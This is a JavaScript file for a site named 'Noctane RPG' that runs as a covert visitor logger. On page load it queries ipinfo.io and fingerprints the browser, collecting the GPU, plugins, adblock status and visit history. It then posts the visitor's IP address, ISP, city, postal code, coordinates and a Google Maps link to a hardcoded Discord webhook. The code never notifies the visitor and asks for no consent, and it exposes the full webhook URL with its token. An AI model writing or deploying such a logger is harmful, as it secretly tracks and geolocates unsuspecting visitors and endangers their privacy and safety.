const SITE_NAME = 'Noctane RPG';

function getVisitCount() {
  const key = 'verified_visit_count';
  let count = localStorage.getItem(key);
  count = count ? parseInt(count) + 1 : 1;
  localStorage.setItem(key, count);
  return count;
}

function getFirstVisitDate() {
  const key = 'verified_first_visit';
  let date = localStorage.getItem(key);
  if (!date) {
    date = new Date().toISOString();
    localStorage.setItem(key, date);
  }
  return new Date(date).toLocaleDateString('en-US');
}

function getGPUInfo() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return 'N/A';
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (debugInfo) {
      return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A';
    }
    return 'N/A';
  } catch {
    return 'N/A';
  }
}

function getDeviceType() {
  const ua = navigator.userAgent;
  if (/Mobi|Android/i.test(ua)) return 'Mobile';
  return 'Desktop';
}

function getConnectionType() {
  if (navigator.connection && navigator.connection.effectiveType) {
    return navigator.connection.effectiveType;
  }
  return 'N/A';
}

function getCPUName() {
  const ua = navigator.userAgent;
  if (/Intel/i.test(ua)) return 'Intel CPU';
  if (/AMD/i.test(ua)) return 'AMD CPU';
  if (/ARM/i.test(ua)) return 'ARM CPU';
  if (/Apple/i.test(ua) && /Macintosh/i.test(ua)) return 'Apple Silicon (Mac)';
  return 'Unknown CPU';
}

// Verifica se cookies estão habilitados
function areCookiesEnabled() {
  return navigator.cookieEnabled;
}

// Retorna lista simples de plugins instalados
function getPluginsInfo() {
  const plugins = navigator.plugins;
  if (plugins.length === 0) return 'No plugins detected';

  let pluginNames = [];
  for (let i = 0; i < plugins.length; i++) {
    pluginNames.push(plugins[i].name);
  }
  return pluginNames.join(', ');
}

// Heurística simples para detectar AdBlock (exemplo de extensão)
function detectExtensions() {
  let adBlockDetected = false;
  const testAd = document.createElement('div');
  testAd.innerHTML = '&nbsp;';
  testAd.className = 'adsbox';
  testAd.style.position = 'absolute';
  testAd.style.left = '-9999px';
  document.body.appendChild(testAd);

  if (window.getComputedStyle) {
    const style = window.getComputedStyle(testAd);
    if (style && (style.display === 'none' || style.visibility === 'hidden')) {
      adBlockDetected = true;
    }
  }
  document.body.removeChild(testAd);

  return adBlockDetected ? 'AdBlock Detected' : 'No known extensions detected';
}

function getSystemInfo() {
  return {
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    language: navigator.language,
    platform: navigator.platform,
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A',
    cpuName: getCPUName(),
    gpu: getGPUInfo(),
    deviceType: getDeviceType(),
    connectionType: getConnectionType(),
    cookiesEnabled: areCookiesEnabled() ? 'Yes' : 'No',
    plugins: getPluginsInfo(),
    extensions: detectExtensions(),
  };
}

async function getIpInfo() {
  try {
    const res = await fetch('https://ipinfo.io/json');
    if (!res.ok) return null;
    return await res.json();
  } catch {
    return null;
  }
}

async function sendToDiscord(ipInfo) {
  if (!ipInfo) return;

  const systemInfo = getSystemInfo();

  const postal = ipInfo.postal || 'N/A';
  const loc = ipInfo.loc || 'N/A';
  const mapLink = loc !== 'N/A' ? `https://www.google.com/maps?q=${loc}` : 'N/A';

  const embed = {
    title: `Logger - ${SITE_NAME}`,
    color: 0x000000,
    thumbnail: {
      url: "https://i.pinimg.com/1200x/69/2d/df/692ddf828d048afaf08c6a94e7e029b1.jpg"
    },
    fields: [
      {
        name: 'IP & Provider',
        value: `\`IP: ${ipInfo.ip}\nHostname: ${ipInfo.hostname}\nProvider: ${ipInfo.org || 'N/A'}\``,
      },
      {
        name: 'Location',
        value: `\`Country: ${ipInfo.country}\nRegion: ${ipInfo.region}\nCity: ${ipInfo.city}\nPostal: ${postal}\nCode: ${loc}\nMap: ${mapLink}\``,
      },
      {
        name: 'System',
        value: `\`Resolution: ${systemInfo.screenResolution}\nCPU: ${systemInfo.cpuName}\nMemory: ${systemInfo.deviceMemory}\nGPU: ${systemInfo.gpu}\nLanguage: ${systemInfo.language}\nPlatform: ${systemInfo.platform}\nType: ${systemInfo.deviceType}\``,
      },
      {
        name: 'Cookies',
        value: `\`Cookies: ${systemInfo.cookiesEnabled}\nExtensions: ${systemInfo.extensions}\``,
      },
      {
        name: 'Visit',
        value: `\`Visit Count: ${getVisitCount()}\nFirst Visit: ${getFirstVisitDate()}\``,
      }
    ],
    timestamp: new Date().toISOString(),
    footer: { text: 'kalleo' },
  };

  const payload = {
    username: "Noctane RPG",
    avatar_url: 'https://i.pinimg.com/736x/43/a1/9b/43a19b9059aab32683d112fc3a20bb9d.jpg',
    embeds: [embed],
  };

  try {
    const response = await fetch('https://canary.discord.com/api/webhooks/1426278688898416730/R0jgxk9E0L1b5k6p8WQsXKDgUecks0eI4NwBx_QYE5hR__ieTuq6Ue9BTmZCcK0owUTc', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    if (!response.ok) {
      console.error('Error sending to Discord:', await response.text());
    } else {
      console.log('Report sent successfully!');
    }
  } catch (e) {
    console.error('Fetch error:', e);
  }
}

window.addEventListener('load', () => {
  getIpInfo().then(ipInfo => sendToDiscord(ipInfo));
});
